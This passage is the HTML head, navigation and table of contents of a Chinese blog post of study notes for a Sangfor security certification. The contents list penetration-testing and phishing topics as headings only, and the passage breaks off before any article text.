<meta property="og:image" content="https://pic.imgdb.cn/item/675958c8d0e0a243d4e1c7fd.png">
<meta property="og:image" content="https://pic.imgdb.cn/item/67595a0ad0e0a243d4e1c88a.png">
<meta property="og:image" content="https://pic.imgdb.cn/item/67595a4bd0e0a243d4e1c8a3.png">
<meta property="og:image" content="https://pic.imgdb.cn/item/67595d75d0e0a243d4e1c9b7.png">
<meta property="og:image" content="https://pic.imgdb.cn/item/67595dc9d0e0a243d4e1c9c4.png">
<meta property="og:image" content="https://pic.imgdb.cn/item/67595e51d0e0a243d4e1c9eb.png">
<meta property="og:image" content="https://pic.imgdb.cn/item/67595e76d0e0a243d4e1c9f5.png">
<meta property="og:image" content="https://pic.imgdb.cn/item/67595ef0d0e0a243d4e1ca0f.png">
<meta property="og:image" content="https://pic.imgdb.cn/item/67596187d0e0a243d4e1caf9.png">
<meta property="og:image" content="https://pic.imgdb.cn/item/675961cfd0e0a243d4e1cb00.png">
<meta property="og:image" content="https://pic.imgdb.cn/item/675961f9d0e0a243d4e1cb08.png">
<meta property="og:image" content="https://pic.imgdb.cn/item/67596225d0e0a243d4e1cb0e.png">
<meta property="og:image" content="https://pic.imgdb.cn/item/6759636dd0e0a243d4e1cb5f.png">
<meta property="og:image" content="https://pic.imgdb.cn/item/67598f7ed0e0a243d4e1d6c5.png">
<meta property="og:image" content="https://pic.imgdb.cn/item/67598fd5d0e0a243d4e1d6d7.png">
<meta property="og:image" content="https://pic.imgdb.cn/item/67599007d0e0a243d4e1d6ed.png">
<meta property="og:image" content="https://pic.imgdb.cn/item/6759903fd0e0a243d4e1d709.png">
<meta property="og:image" content="https://pic.imgdb.cn/item/67599094d0e0a243d4e1d728.png">
<meta property="og:image" content="https://pic.imgdb.cn/item/675990cdd0e0a243d4e1d734.png">
<meta property="og:image" content="https://pic.imgdb.cn/item/675990e8d0e0a243d4e1d73d.png">
<meta property="og:image" content="https://pic.imgdb.cn/item/6759911fd0e0a243d4e1d74a.png">
<meta property="og:image" content="https://pic.imgdb.cn/item/6759918ad0e0a243d4e1d75a.png">
<meta property="og:image" content="https://pic.imgdb.cn/item/67599267d0e0a243d4e1d780.png">
<meta property="og:image" content="https://pic.imgdb.cn/item/675992cfd0e0a243d4e1d793.png">
<meta property="og:image" content="https://pic.imgdb.cn/item/67599325d0e0a243d4e1d7a5.png">
<meta property="og:image" content="https://pic.imgdb.cn/item/675993a0d0e0a243d4e1d7a9.png">
<meta property="og:image" content="https://pic.imgdb.cn/item/675993d8d0e0a243d4e1d7cc.png">
<meta property="og:image" content="https://pic.imgdb.cn/item/675993d8d0e0a243d4e1d7cc.png">
<meta property="og:image" content="https://www.helloimg.com/i/2024/12/11/675996608e36f.png">
<meta property="og:image" content="https://www.helloimg.com/i/2024/12/11/675996a37f8d6.png">
<meta property="og:image" content="https://www.helloimg.com/i/2024/12/12/675a4974d5c6a.png">
<meta property="og:image" content="https://www.helloimg.com/i/2024/12/12/675a4a05b3152.png">
<meta property="og:image" content="https://www.helloimg.com/i/2024/12/12/675a4a4539832.png">
<meta property="og:image" content="https://www.helloimg.com/i/2024/12/12/675a4aaddd924.png">
<meta property="og:image" content="https://www.helloimg.com/i/2024/12/12/675a4c659b84d.png">
<meta property="og:image" content="https://www.helloimg.com/i/2024/12/12/675a51a524829.png">
<meta property="og:image" content="https://www.helloimg.com/i/2024/12/12/675a520a45cea.png">
<meta property="og:image" content="https://www.helloimg.com/i/2024/12/12/675a52565611f.png">
<meta property="og:image" content="https://www.helloimg.com/i/2024/12/12/675a52b3ad5a5.png">
<meta property="og:image" content="https://www.helloimg.com/i/2024/12/12/675a52919b8df.png">
<meta property="og:image" content="https://www.helloimg.com/i/2024/12/12/675a54a698068.png">
<meta property="og:image" content="https://www.helloimg.com/i/2024/12/12/675a54d78db00.png">
<meta property="og:image" content="https://www.helloimg.com/i/2024/12/12/675a5504efa19.png">
<meta property="og:image" content="https://www.helloimg.com/i/2024/12/12/675a55691a775.png">
<meta property="og:image" content="https://www.helloimg.com/i/2024/12/12/675a559a19d17.png">
<meta property="og:image" content="https://www.helloimg.com/i/2024/12/12/675a569ea3dfe.png">
<meta property="og:image" content="https://www.helloimg.com/i/2024/12/12/675a56728176b.png">
<meta property="og:image" content="https://www.helloimg.com/i/2024/12/12/675a57d979f85.png">
<meta property="og:image" content="https://www.helloimg.com/i/2024/12/12/675a586c7c31b.png">
<meta property="og:image" content="https://www.helloimg.com/i/2024/12/12/675a58c0e4d3b.png">
<meta property="og:image" content="https://www.helloimg.com/i/2024/12/12/675a5b111a88c.png">
<meta property="og:image" content="https://www.helloimg.com/i/2024/12/12/675a5bf55938e.png">
<meta property="og:image" content="https://www.helloimg.com/i/2024/12/12/675a5c57dea19.png">
<meta property="og:image" content="https://www.helloimg.com/i/2024/12/12/675a5cbd3c6ad.png">
<meta property="og:image" content="https://www.helloimg.com/i/2024/12/12/675a5d32c4c44.png">
<meta property="og:image" content="https://www.helloimg.com/i/2024/12/12/675a6000f124c.png">
<meta property="og:image" content="https://www.helloimg.com/i/2024/12/12/675aefbbc408c.png">
<meta property="og:image" content="https://www.helloimg.com/i/2024/12/12/675af1833cb59.png">
<meta property="og:image" content="https://www.helloimg.com/i/2024/12/12/675af2817fb2a.png">
<meta property="og:image" content="https://www.helloimg.com/i/2024/12/14/675cffb39280a.png">
<meta property="og:image" content="https://www.helloimg.com/i/2024/12/14/675d90ac16ddf.png">
<meta property="og:image" content="https://www.helloimg.com/i/2024/12/14/675d92262d2ea.png">
<meta property="og:image" content="https://www.helloimg.com/i/2024/12/14/675d92ecec548.png">
<meta property="og:image" content="https://www.helloimg.com/i/2024/12/14/675d931f31e0e.png">
<meta property="og:image" content="https://www.helloimg.com/i/2024/12/14/675d9355c764b.png">
<meta property="og:image" content="https://www.helloimg.com/i/2024/12/14/675d937fb3616.png">
<meta property="og:image" content="https://www.helloimg.com/i/2024/12/15/675ef2f05456f.png">
<meta property="og:image" content="https://www.helloimg.com/i/2024/12/15/675ef313acc34.png">
<meta property="og:image" content="https://www.helloimg.com/i/2024/12/15/675ef3a5eecf2.png">
<meta property="og:image" content="https://www.helloimg.com/i/2024/12/15/675ef3e0139e9.png">
<meta property="og:image" content="https://www.helloimg.com/i/2024/12/15/675ef431f21fd.png">
<meta property="og:image" content="https://www.helloimg.com/i/2024/12/15/675ef468510b9.png">
<meta property="og:image" content="https://www.helloimg.com/i/2024/12/15/675ef5707709a.png">
<meta property="og:image" content="https://www.helloimg.com/i/2024/12/15/675ef588b4318.png">
<meta property="og:image" content="https://www.helloimg.com/i/2024/12/15/675ef5af209fe.png">
<meta property="og:image" content="https://www.helloimg.com/i/2024/12/15/675ef6087272f.png">
<meta property="og:image" content="https://www.helloimg.com/i/2024/12/15/675ef62e7a66a.png">
<meta property="og:image" content="https://www.helloimg.com/i/2024/12/15/675ef692872a2.png">
<meta property="og:image" content="https://www.helloimg.com/i/2024/12/15/675ef6d162a1c.png">
<meta property="og:image" content="https://www.helloimg.com/i/2024/12/15/675ef765b2478.png">
<meta property="article:published_time" content="2024-09-30T11:41:49.188Z">
<meta property="article:modified_time" content="2025-08-20T15:37:27.329Z">
<meta property="article:author" content="mX1@0">
<meta property="article:tag" content="深信服">
<meta property="article:tag" content="安全服务认证">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://pic.imgdb.cn/item/67403caad29ded1a8cc70249.png">
  
  
  
    <link rel="shortcut icon" href="/images/%E5%9B%BE1.jpg">
  
  
<link rel="stylesheet" href="/css/style.css">

  <link rel="preload" as="style" onload="this.onload&#x3D;null;this.rel&#x3D;&#39;stylesheet&#39;" href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css" integrity="sha384-IfxC36XL&#x2F;toUyJ939C73PcgMuRzAZuIzZxE38drsmO5p6jD7ei+Zx&#x2F;1oA&#x2F;0l8ysE" crossorigin="anonymous">
  
  
  
  
    
<script src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js" integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"></script>

  
  
    
<link rel="stylesheet" href="https://npm.webcache.cn/@reimujs/aos@0.1.2/dist/aos.css" integrity="sha384-GMRP93c6Hkz9JVKGAuRR3nTS7M07RwPgTFenXiosjq2VbVgvdDNcz1g6Mkj8AONa" crossorigin="anonymous">

  
  
  
<meta name="generator" content="Hexo 7.3.0">
<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
</head>

  <body>
    
    
  <div id='loader'>
    <div class="loading-left-bg loading-bg"></div>
    <div class="loading-right-bg loading-bg"></div>
    <div class="spinner-box">
      <div class="loading-taichi rotate">
        
          <svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
            <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="var(--red-1, #ff5252)" />
            <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
           M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="var(--red-1, #ff5252)" />
          </svg>
        
      </div>
      
      
        
      
      <div class="loading-word">加载中...</div>
    </div>
  </div>
  </div>
  <script>
    var time = null;
    var startLoading = () => {
      time = Date.now();
      document.getElementById('loader').classList.remove("loading");
    }
    var endLoading = () => {
      if (!time) {
        document.body.style.overflow = 'auto';
        document.getElementById('loader').classList.add("loading");
      } else {
        if (Date.now() - time > 500) {
          time = null;
          document.body.style.overflow = 'auto';
          document.getElementById('loader').classList.add("loading");
        } else {
          setTimeout(endLoading, 500 - (Date.now() - time));
          time = null;
        }
      }
    }
    window.addEventListener('DOMContentLoaded', endLoading);
    document.getElementById('loader').addEventListener('click', endLoading);
  </script>

<div id="copy-tooltip" style="pointer-events: none; opacity: 0; transition: all 0.2s ease; position: fixed;top: 50%;left: 50%;z-index: 999;transform: translate(-50%, -50%);color: white;background: rgba(0, 0, 0, 0.5);padding: 10px 15px;border-radius: 10px;">
</div>
<div id="heatmap-tooltip"></div>


    <div id="container">
      <div id="wrap">
        <div id="header-nav">
  <nav id="main-nav">
    
      
        <span class="main-nav-link-wrap">
          <div class="main-nav-icon icon rotate">
             
              &#xe62b;
             
          </div>
          <a class="main-nav-link" href="/">首页</a>
        </span>
      
        <span class="main-nav-link-wrap">
          <div class="main-nav-icon icon rotate">
             
              &#xe62b;
             
          </div>
          <a class="main-nav-link" href="/archives">归类</a>
        </span>
      
        <span class="main-nav-link-wrap">
          <div class="main-nav-icon icon rotate">
             
              &#xe62b;
             
          </div>
          <a class="main-nav-link" href="/about">关于</a>
        </span>
      
        <span class="main-nav-link-wrap">
          <div class="main-nav-icon icon rotate">
             
              &#xe62b;
             
          </div>
          <a class="main-nav-link" href="/friend">友链</a>
        </span>
      
    
    <a id="main-nav-toggle" class="nav-icon"></a>
  </nav>
  <nav id="sub-nav">
    
    
    
  </nav>
  
</div>
<header id="header">
  
    
      
        <picture>
          
        </picture>
        
          <img  fetchpriority="high" src="/images/%E7%8E%9B%E8%8E%8E%E6%8B%89%E8%92%82.jpg" alt="深信服安全服务认证工程师学习笔记">
        
      
    
  
  <div id="header-outer">
    <div id="header-title">
      
        
        
          <a href="/" id="logo">
            <h1 data-aos="slide-up">深信服安全服务认证工程师学习笔记</h1>
          </a>
        
      
      
        
        <h2 id="subtitle-wrap" data-aos="slide-down">
          
        </h2>
      
    </div>
  </div>
</header>

        <div id="content" class="sidebar-left"  >
          <aside id="sidebar">
  
  
  
  <div class="sidebar-wrapper wrap-sticky">
    <div class="sidebar-wrap" data-aos="fade-up">
      
        
          <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
  <h3 class="toc-title">Contents</h3>
  <div class="sidebar-toc-wrapper toc-div-class" >
      
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%B7%B1%E4%BF%A1%E6%9C%8D%E5%AE%89%E5%85%A8%E6%9C%8D%E5%8A%A1%E8%AE%A4%E8%AF%81%E5%B7%A5%E7%A8%8B%E5%B8%88%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0"><span class="toc-text">深信服安全服务认证工程师学习笔记</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E7%AB%A0-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80"><span class="toc-text">第一章 网络安全基础</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E9%83%A8%E5%88%86-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80"><span class="toc-text">第一部分 网络安全基础</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E9%83%A8%E5%88%86-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E9%85%8D%E7%BD%AE%E4%B8%8E%E5%BA%94%E7%94%A8"><span class="toc-text">第二部分 操作系统配置与应用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B8%89%E9%83%A8%E5%88%86-%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%8E%9F%E7%90%86%E4%B8%8E%E5%BA%94%E7%94%A8"><span class="toc-text">第三部分 计算机网络原理与应用</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E7%AB%A0-%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%9F%BA%E7%A1%80"><span class="toc-text">第二章 网络渗透测试基础</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E9%83%A8%E5%88%86-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A6%82%E8%BF%B0"><span class="toc-text">第一部分 渗透测试概述</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#2-1-1-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A0%87%E5%87%86%E4%B8%8E%E6%B5%81%E7%A8%8B"><span class="toc-text">2.1.1 渗透测试标准与流程</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A6%82%E8%BF%B0"><span class="toc-text">渗透测试概述</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%88%86%E7%B1%BB"><span class="toc-text">渗透测试分类</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A0%87%E5%87%86%E4%B8%8E%E6%89%A7%E8%A1%8C%E6%B5%81%E7%A8%8B"><span class="toc-text">渗透测试标准与执行流程</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-1-2-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%8A%A5%E5%91%8A"><span class="toc-text">2.1.2 渗透测试报告</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%8A%A5%E5%91%8A%E7%9A%84%E9%87%8D%E8%A6%81%E6%80%A7"><span class="toc-text">渗透测试报告的重要性</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%AD%A3%E7%A1%AE%E7%BC%96%E5%86%99%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%8A%A5%E5%91%8A"><span class="toc-text">正确编写渗透测试报告</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E9%83%A8%E5%88%86-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E4%B8%8E%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8"><span class="toc-text">第二部分 渗透测试环境搭建与工具使用</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%B8%89%E7%AB%A0-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-text">第三章 信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-text">信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#3-1-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E6%80%BB%E8%A7%88"><span class="toc-text">3.1 信息收集总览</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E7%9A%84%E7%A7%8D%E7%B1%BB"><span class="toc-text">信息收集的种类</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#DNS"><span class="toc-text">DNS</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%AD%90%E5%9F%9F%E5%90%8D"><span class="toc-text">子域名</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#C%E6%AE%B5"><span class="toc-text">C段</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E9%82%AE%E7%AE%B1"><span class="toc-text">邮箱</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%8C%87%E7%BA%B9"><span class="toc-text">指纹</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E7%A4%BE%E5%B7%A5%E5%BA%93"><span class="toc-text">社工库</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E9%92%93%E9%B1%BC%E6%94%BB%E5%87%BB"><span class="toc-text">钓鱼攻击</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-2-DNS%E4%BB%8B%E7%BB%8D"><span class="toc-text">3.2 DNS介绍</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#DNS%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86"><span class="toc-text">DNS基本原理</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#DNS%E8%AE%B0%E5%BD%95%E6%9F%A5%E8%AF%A2%E6%96%B9%E6%B3%95"><span class="toc-text">DNS记录查询方法</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%9F%9F%E5%90%8D%E4%BF%A1%E6%81%AF%E6%9F%A5%E8%AF%A2%E6%96%B9%E6%B3%95"><span class="toc-text">域名信息查询方法</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#CDN"><span class="toc-text">CDN</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-3-%E5%AD%90%E5%9F%9F%E5%90%8D%E6%94%B6%E9%9B%86"><span class="toc-text">3.3 子域名收集</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%AD%90%E5%9F%9F%E5%90%8D%E6%94%B6%E9%9B%86%E5%8E%9F%E5%9B%A0"><span class="toc-text">子域名收集原因</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%AD%90%E5%9F%9F%E5%90%8D%E6%94%B6%E9%9B%86%E6%96%B9%E6%B3%95"><span class="toc-text">子域名收集方法</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-4-C%E6%AE%B5%E6%89%AB%E6%8F%8F"><span class="toc-text">3.4 C段扫描</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#C%E6%AE%B5%E6%89%AB%E6%8F%8F%E5%8E%9F%E5%9B%A0"><span class="toc-text">C段扫描原因</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#C%E6%AE%B5%E6%89%AB%E6%8F%8F%E6%96%B9%E6%B3%95"><span class="toc-text">C段扫描方法</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#Nmap"><span class="toc-text">Nmap</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#Masscan"><span class="toc-text">Masscan</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-5-Web%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F"><span class="toc-text">3.5 Web目录扫描</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F%E7%9A%84%E5%8E%9F%E5%9B%A0"><span class="toc-text">目录扫描的原因</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F%E7%9A%84%E6%96%B9%E6%B3%95"><span class="toc-text">目录扫描的方法</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#robots-txt"><span class="toc-text">robots.txt</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E"><span class="toc-text">搜索引擎</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E7%88%86%E7%A0%B4-%E5%8F%8A%E5%B7%A5%E5%85%B7"><span class="toc-text">爆破 及工具</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-6-%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB"><span class="toc-text">3.6 指纹识别</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%B3%BB%E7%BB%9F%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB"><span class="toc-text">系统指纹识别</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB"><span class="toc-text">中间件指纹识别</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Web%E7%A8%8B%E5%BA%8F%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB"><span class="toc-text">Web程序指纹识别</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%98%B2%E7%81%AB%E5%A2%99%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB"><span class="toc-text">防火墙指纹识别</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-7-GoogleHacking"><span class="toc-text">3.7 GoogleHacking</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BB%8B%E7%BB%8D"><span class="toc-text">介绍</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%80%BB%E8%BE%91%E8%BF%90%E7%AE%97%E7%AC%A6"><span class="toc-text">逻辑运算符</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95"><span class="toc-text">基本语法</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%AB%98%E7%BA%A7%E6%A1%88%E4%BE%8B"><span class="toc-text">高级案例</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-8-%E7%BD%91%E7%BB%9C%E7%A9%BA%E9%97%B4%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E"><span class="toc-text">3.8 网络空间搜索引擎</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%BD%91%E7%BB%9C%E7%A9%BA%E9%97%B4%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E%E4%BB%8B%E7%BB%8D"><span class="toc-text">网络空间搜索引擎介绍</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E"><span class="toc-text">常见搜索引擎</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#shodan"><span class="toc-text">shodan</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95-1"><span class="toc-text">基本语法</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8"><span class="toc-text">基本使用</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-9-%E6%83%85%E6%8A%A5%E5%88%86%E6%9E%90"><span class="toc-text">3.9 情报分析</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%83%85%E6%8A%A5%E5%88%86%E6%9E%90%E6%A6%82%E5%BF%B5"><span class="toc-text">情报分析概念</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Maltego"><span class="toc-text">Maltego</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-10-%E7%A4%BE%E5%B7%A5%E5%BA%93%E5%92%8C%E5%A4%9A%E7%BB%B4%E5%BA%A6%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-text">3.10 社工库和多维度信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%A4%BE%E5%B7%A5%E5%BA%93-1"><span class="toc-text">社工库</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%A4%9A%E7%BB%B4%E5%BA%A6%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-text">多维度信息收集</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-11-CobaltStrike%E9%85%8D%E7%BD%AE"><span class="toc-text">3.11 CobaltStrike配置</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Cobalt-Strike%E4%BB%8B%E7%BB%8D"><span class="toc-text">Cobalt Strike介绍</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Cobalt-Strike%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE"><span class="toc-text">Cobalt Strike安装配置</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Cobalt-Strike%E4%BD%BF%E7%94%A8"><span class="toc-text">Cobalt Strike使用</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-12-office%E9%92%93%E9%B1%BC"><span class="toc-text">3.12 office钓鱼</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#office%E9%92%93%E9%B1%BC%E4%BB%8B%E7%BB%8D"><span class="toc-text">office钓鱼介绍</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#CobaltStrike%E9%92%93%E9%B1%BC"><span class="toc-text">CobaltStrike钓鱼</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#CVE-2017-11882"><span class="toc-text">CVE-2017-11882</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-13-%E9%92%93%E9%B1%BC"><span class="toc-text">3.13 钓鱼</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#CHM%E9%92%93%E9%B1%BC"><span class="toc-text">CHM钓鱼</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#LNK%E9%92%93%E9%B1%BC"><span class="toc-text">LNK钓鱼</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#HTA%E9%92%93%E9%B1%BC"><span class="toc-text">HTA钓鱼</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-14-%E7%BD%91%E7%AB%99%E5%85%8B%E9%9A%86%E5%92%8C%E9%92%93%E9%B1%BC%E9%82%AE%E4%BB%B6"><span class="toc-text">3.14 网站克隆和钓鱼邮件</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%BD%91%E7%AB%99%E5%85%8B%E9%9A%86"><span class="toc-text">网站克隆</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%92%93%E9%B1%BC%E9%82%AE%E4%BB%B6"><span class="toc-text">钓鱼邮件</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E5%9B%9B%E7%AB%A0-Web%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E4%B8%8E%E9%AA%8C%E8%AF%81"><span class="toc-text">第四章 Web安全漏洞原理与验证</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" 